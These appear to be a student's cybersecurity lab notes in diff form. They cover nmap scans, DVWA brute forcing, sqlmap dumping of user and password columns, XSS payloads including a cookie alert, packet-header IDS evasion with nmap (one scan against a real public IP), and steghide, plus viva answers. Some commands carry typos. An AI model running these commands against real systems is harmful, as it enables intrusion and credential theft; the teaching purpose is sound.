@@ -1,0 +1,290 @@
+ 1. port scan :
+nmap -sP 192.168.56.0/24
+sudo nmap -sS -p 1-1024 192.168.56.20
+sudo nmap -sA -p 1-1024 192.168.56.20
+sudo nmap -sN -p 1-1024 192.168.56.20
+sudo nmap -sN -p 1-1024 192.168.56.20
+1. What is port scanning and why is it important in cybersecurity?
+Port scanning is the process of sending specially crafted packets to a target system to discover which ports are open, closed, or filtered. It's a fundamental step in network reconnaissance and helps security professionals identify services running on a host, potential vulnerabilities, and firewall behavior.
+2. Explain the working of the PING Scan in Nmap.
+PING Scan checks if a device is online. It sends ICMP (ping) or TCP packets, and if it gets a reply, the system is active.
+3. What is a SYN Scan and why is it called stealthy?
+SYN Scan sends a SYN packet and waits for a reply. If it gets SYN-ACK, the port is open. It doesn't complete the connection, so it's hard to detect — that's why it's stealthy.
+
+4. How does the ACK scan work and what is its purpose?
+ACK Scan sends only an ACK flag. If the system replies with RST, the port is unfiltered. If there’s no reply, it might be blocked by a firewall..
+5. What is the purpose of the NULL Scan?
+NULL Scan sends a packet with no flags. It checks how the system responds and can help find open or filtered ports, especially on older systems.
+6. Describe the XMAS Scan and why it’s named so.
+XMAS scan (-sX) sends TCP packets with FIN, PSH, and URG flags set. It lights up the packet like a Christmas tree, hence the name. It attempts to identify open ports by checking for the absence of responses.
+7. What is the difference between open, closed, and filtered ports in Nmap results?
+Open: A service is listening. Closed: No service is listening, but port is reachable. Filtered: A firewall or filter is preventing access, making it hard to determine port status.
+8. Why do we use Metasploitable as the target in this lab?
+Metasploitable is a vulnerable virtual machine designed for practicing penetration testing in a safe environment. It allows ethical hackers to test real-world attack methods legally.
+9. How can firewalls affect the results of these scans?
+Firewalls can block scan packets or responses, causing ports to appear filtered. They may also log or drop certain types of traffic, affecting scan accuracy.
+10. What are the ethical considerations while performing port scanning?
+Always scan systems with proper authorization. Unauthorized scanning can be illegal and interpreted as malicious activity. Ethical hackers must operate within legal and defined boundaries.
+
+ 2. Perform Brute Force attack using Burp suite:
+ 1.	sudo apt install apache2 php php-mysqli mariadb-server git unzip -y
+2.	cd /var/www/html
+3.	sudo git clone https://github.com/digininja/DVWA.git
+4.	sudo chmod -R 755 /var/www/html/DVWA/
+5.	cd /var/www/html/DVWA/config
+6.	sudo cp config.inc.php.dist config.inc.php
+7.	sudo nano config.inc.php 
+8.	change user as admin and password as password and save and exit
+9.	sudo systemctl start mysql
+10.	sudo su
+11.	mysql -u root -p
+12.	create database dvwa;
+13.	create user ‘admin’@’127.0.0.1’ identified by ‘password’;
+14.	grant all privileges on dvwa.* to ‘admin’@’127.0.0.1’;
+15.	exit
+16.	systemctl restart apache2
+17.	cd /etc/php
+18.	ls n then cd 8.4
+19.	nano php.ini
+20.	press control+f and search for fopen 
+21.	url_fopn = on-
+22.	url_include = on 
+23.	save the file and then again type 
+24.	systemctl restart apache2
+25.	go to browser and type 127.0.0.1/DVWA
+26.	now do the burpsuite condiguration n start attack
+Types of Brute Force Attacks
+1. Simple Brute Force: Tries all possible combinations of passwords.
+2. Dictionary Attack: Uses a predefined list of common passwords.
+3. Hybrid Attack: Combines dictionary words with numbers/special characters.
+4. Credential Stuffing: Uses previously leaked username-password pairs.
+
+  EXP 3 To learn simulation of SQL injection attack
+sudo apt update
+sudo apt install sqlmap -y
+🔹 Step 1: Basic SQL Injection Test
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" --dbs
+Explanation:
+•	-u: Target URL
+•	--dbs: Enumerates all databases if vulnerable
+Step 2: List Tables from a Specific Database
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart --tables
+Explanation:
+•	-D acuart: Target database
+•	--tables: List all tables in the database
+Step 3: List Columns in a Specific Table
+Suppose you found a table called users, then:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users --columns
+Explanation:
+•	-T users: Target table
+•	--columns: List all columns in the table
+Step 4: Dump Specific Column Data
+To extract usernames:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C uname --dump
+To extract passwords:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C pass –dump
+What is SQL Injection? 
+SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with an application’s database queries. By injecting malicious SQL statements, an attacker can bypass authentication, retrieve, modify, or delete data, and even execute system-level commands. 
+Types of SQL Injection 
+1. Boolean-Based SQL Injection – Uses conditional statements to determine true/false responses. 
+2. Time-Based SQL Injection – Uses database-specific time delays to infer injection success. 
+3. Error-Based SQL Injection – Exploits database error messages to extract data. 
+4. Union-Based SQL Injection – Uses the UNION SQL operator to fetch data from multiple tables. 
+5. Blind SQL Injection – Extracts data indirectly by analyzing responses or delays. 
+
+
+What is SQLMap? 
+SQLMap is an open-source penetration testing tool that automates SQL injection detection and exploitation. It supports multiple database management systems (MySQL, PostgreSQL, Oracle, etc.) and various SQL injection techniques.
+CONCLUSION
+Using SQLMap, we successfully identified and exploited SQL injection vulnerabilities in the target website. We enumerated databases, listed tables and columns, and extracted sensitive data. This highlights the critical impact of SQL injection and the need for secure coding practices such as:
+•	Using parameterized queries or prepared statements
+•	Deploying web application firewalls (WAF)
+•	Conducting regular security audits and patching vulnerabilities
+SQLMap is a powerful tool meant strictly for authorized ethical hacking and security testing.
+
+ EXP 4 Aim: To demonstrate a Cross-Site Scripting (XSS) attack by injecting malicious scripts 
+into a vulnerable web application.
+Requirements:
+• A computer with Kali Linux or any OS with web penetration testing tools.
+• A vulnerable web application like DVWA (Damn Vulnerable Web Application) or 
+BWAPP (Buggy Web Application).
+• A web browser (Chrome, Firefox)
+theory
+What is XSS?
+Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject 
+malicious scripts into a trusted website, which is then executed in the victim’s browser.
+Types of XSS Attacks
+1. Stored XSS: The malicious script is permanently stored on the server and executed 
+when the victim loads the page.
+2. Reflected XSS: The malicious script is included in a URL and executed when the 
+victim clicks the link.
+3. DOM-Based XSS: The malicious script is executed by modifying the Document 
+Object Model (DOM) in the browser
+REFLECTED XSS 
+Script 1: Basic JavaScript Popup
+<script>alert('XSS')</script>
+📌 What it does: Displays a popup with the message XSS.
+
+✅ Script 2: Display User's Cookie
+<script>alert(document.cookie)</script>
+📌 What it does: Pops up the current session cookie of the logged-in user 
+STORED XSS
+SCRIPT 1
+<script>confirm('U R HACKED')</script>
+VIVA QUESTIONS 
+✅ 1. What is Cross-Site Scripting (XSS)?
+Answer:Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious scripts into content delivered to users. These scripts are executed by the victim’s browser, often without their knowledge, and can be used to steal cookies, hijack sessions, or manipulate website behavior.
+
+✅ 2. What is the difference between Reflected, Stored, and DOM-based XSS?
+Answer:
+Reflected XSS: The script is reflected off the server (e.g., in URL parameters) and executed immediately when the user clicks a malicious link.
+Stored XSS: The script is stored on the server (e.g., in comments or forms) and executed when any user visits the affected page.
+DOM-based XSS: The vulnerability exists in the client-side JavaScript code, which dynamically updates the DOM without proper sanitization.
+
+✅ 3. How does a basic XSS payload work?
+Answer:A basic XSS payload like <script>alert('XSS')</script> is injected into a vulnerable input field. If the application does not sanitize input properly, this script is included in the HTML response and executed by the browser, showing a popup as proof of concept.
+
+✅ 4. What are the risks associated with XSS attacks?
+Answer:Session hijacking: Stealing user session cookies to impersonate them.
+
+Credential theft: Capturing login info via fake forms or keyloggers.
+
+Website defacement: Altering page content using scripts.
+
+Phishing: Redirecting users to malicious websites.
+
+Browser exploitation: Running harmful code on the client.
+
+✅ 5. How can developers prevent XSS attacks?
+Answer:
+Input validation: Reject or sanitize user input to prevent script injection.
+Output encoding: Convert special characters like <, >, ", ' before displaying.
+Use security libraries: Frameworks like React, Angular escape output automatically.
+CSP (Content Security Policy): Restricts the sources from which scripts can be loaded.
+Avoid eval() and innerHTML: Use safer methods like textContent.
+     
+
+EXP 8 AIM : Study the behavior of protections such as IDF and firewalls when altering headers
+in network packets.
+ Lab Outcome:
+● Understand how network security tools like IDS and firewalls monitor and filter traffic.
+● Analyze how changes in packet headers affect the detection mechanisms.
+● Identify how malicious actors may attempt to evade detection using header manipulation.
+Requirement:
+● Wireshark (packet capturing tool)
+● Nmap
+● A configured firewall (e.g., iptables or Windows Defender Firewall)
+● Internet connection or a simulated network environment
+● Administrative privileges for testing 
+8.5 Related Theory:
+Firewalls and IDS are essential components of network security.
+● Firewalls are used to filter incoming and outgoing traffic based on defined rules. They
+operate mainly on packet headers to allow or block traffic.
+● IDS monitor traffic for suspicious activity and known attack signatures.
+● Packet headers contain metadata like source IP, destination IP, protocol, flags, etc., and
+are crucial for determining packet legitimacy.
+● Header alteration can be used by attackers to bypass security controls. For example,
+spoofing a source IP, changing TTL to avoid detection, or fragmenting packets.
+● By using Nmap's options like -sS, -sF, -sN, or --source-port, one can observe how
+security tools respond to unusual or suspicious packet headers.
+STEPS TO PERFORM:
+1.) By Fragmenting the packets with 8 bit data:
+start the wireshark n in filters enter ip n select any one ip address n in terminal type this 
+sudo nmap -sS -Pn -f -F <target_ip> in target ip enter the ip u want to target 
+EXPLANATION :1. The -f option in Nmap allows you to fragment the packets. By default, it will split packets into fragments of 8-byte lengths.
+ 2.This command will send fragmented packets to the target IP address and will attempt to bypass firewalls or intrusion detection systems that might block non-fragmented packets.
+ BY RUNNING THE COMMAND U WILL GET TO SEE THE OPEN PORTS
+ 2.) By generating ip packets with specific length:
+ TYPE THIS IN FILTERS IN WIRESHARK ip.src == 10.0.2.15 && tcp.len > 0
+ then in terminal type this 
+sudo nmap -sS -Pn --data-length <length> -p <port> <target_ip> in length add the lenth of ur ip , port n ip address of destination
+3.) 3. By manipulating the TTL value
+type this in filters of wireshark : ip.ttl <= 64
+then in terminal run : sudo nmap -sS -Pn --ttl <TTL_VALUE> -F <TARGET_IP>
+4.) 4. By sending packets with bogus TCP/UDP checksums
+in filters of wireshark type this : (ip.addr == 10.0.2.15)
+n in terminal type this : sudo nmap -sS -Pn --badsum -p <port(s)> <target_ip>
+sudo nmap -sS -Pn --badsum -p 443 34.149.100.209
+ VIVA QUESTIONS ; 
+ 1. What is the purpose of fragmenting packets with 8-bit data in network security testing?
+Answer:Fragmenting packets with 8-bit data helps bypass firewalls or IDS systems that block larger, unfragmented packets. By splitting the data, it may evade detection and allow malicious traffic through.
+
+2. What command is used to fragment packets in Nmap?
+Answer:The command used to fragment packets in Nmap is:
+sudo nmap -sS -Pn -f -F <target_ip>
+This command fragments packets and sends them to the target to test how firewalls handle fragmented traffic.
+
+3. How do you filter IP packets by length in Wireshark?
+Answer:To filter IP packets based on length in Wireshark, use the filter:
+ip.src == <source_ip> && tcp.len > 0
+This will show the packets from the specified source IP with a non-zero TCP length.
+
+4. What is the significance of manipulating the TTL (Time-To-Live) value in network testing?
+Answer:Manipulating the TTL value tests how firewalls and IDS systems handle packets with different TTLs. It can help in evading detection or bypassing certain security measures by altering the packet's apparent "lifetime."
+
+5. What command is used to send packets with bogus TCP/UDP checksums?
+Answer:To send packets with bogus checksums, use this Nmap command:
+sudo nmap -sS -Pn --badsum -p <port> <target_ip>
+This command sends packets with incorrect checksums to test how security systems handle such malformed packets. 
+CONCLUSION : In this experiment, we tested how altering packet headers affects firewalls and IDS systems. By fragmenting packets, changing packet lengths, modifying TTL values, and using bogus checksums, we observed different system responses. Some manipulations successfully bypassed security defenses, revealing vulnerabilities in how firewalls and IDS handle these packet changes. This highlights the need for advanced, updated security measures to prevent evasion and ensure robust network protection.
+
+EXP 9    Study of steganography tools
+Commands:
+1.	sudo apt update
+2.	sudo apt install steghide –y
+3.	cd Desktop          (Save a .jpeg image from the browser to the Desktop and an empty file called secret.txt file as well)
+4.	ls
+5.	echo “This is a very nice code” > secret.txt        (The sentence is saved in the secret.txt)
+6.	steghide embed -cf hacker.jpeg -ef secret.txt
+Enter paraphrase(password):abcd
+RE-Enter paraphrase: abcd
+7.	ls –l
+8.	steghide extract -sf hacker.jpeg
+Enter paraphrase: abcd
+9.	cat secret.txt
+This is a very nice code
+Lab Outcome: After performing this experiment, students will:
+• Understand the concept of steganography.
+• Learn how to hide and extract secret messages using Steghide.
+Requirement:
+• Steghide tool (install using sudo apt install steghide on Linux).
+• A cover file (image or audio file, e.g., .jpg, .bmp, .wav).
+• A text file containing the secret message to hide.
+• Terminal or Command Prompt access
+Related Theory:
+What is Steganography?
+Steganography is a technique of hiding secret information within a non-suspicious file (like 
+an image or audio file) so that only the sender and the receiver know its existence. Unlike 
+cryptography, which encrypts data making it unreadable, steganography hides the data in 
+plain sight.
+How Steghide Works?
+Steghide is an open-source tool that allows users to embed and extract hidden data within 
+images and audio files. It supports encryption and maintains file integrity, ensuring the 
+hidden data remains undetectable.
+Key Features of Steghide:
+• Supports JPEG, BMP, WAV, and AU file formats.
+• Uses AES-128 encryption for secure embedding.
+• Preserves the original file size and quality
+ Conclusion: We successfully implemented steganography using the Steghide tool. We 
+were able to hide a secret message inside an image without altering its appearance. We 
+extracted the hidden message securely using the correct passphrase. This experiment 
+demonstrated how steganography can be used for secure communication but also 
+highlighted its potential risks in cybersecurity and digital forensics
+Viva Questions for Steganography Experiment:
+What is Steganography?
+Answer: Steganography is the technique of hiding secret information inside a non-suspicious file, like an image or audio file, so that only the sender and receiver know about the hidden information. Unlike cryptography, which encrypts data to make it unreadable, steganography hides data in plain sight.
+
+How does Steghide work for embedding and extracting data?
+Answer: Steghide works by embedding a secret message into a cover file (e.g., an image or audio file). It encrypts the data using AES-128 encryption and ensures that the cover file’s appearance and size are not altered. To extract the hidden message, a passphrase is required to decrypt and retrieve the information.
+
+What are the file formats supported by Steghide?
+Answer: Steghide supports image file formats like JPEG and BMP, and audio file formats like WAV and AU.
+
+What is the importance of the passphrase in Steghide?
+Answer: The passphrase is crucial in Steghide as it is used for encryption and decryption of the hidden data. Without the correct passphrase, it is not possible to extract the embedded data, ensuring the confidentiality and security of the hidden information.
+
+Why is Steganography considered useful in cybersecurity?
+Answer: Steganography is useful in cybersecurity as it allows secure communication by hiding data in a way that avoids detection by traditional security measures like firewalls or intrusion detection systems. It is especially helpful for covert communication or for protecting sensitive data.
+
+What are the risks of using Steganography in a digital forensics context?
+Answer: In digital forensics, steganography poses a challenge because it can be used to hide malicious or illegal content. Detecting and analyzing hidden messages in digital files can be complex and time-consuming, making it difficult to uncover evidence in criminal investigations or data breaches.
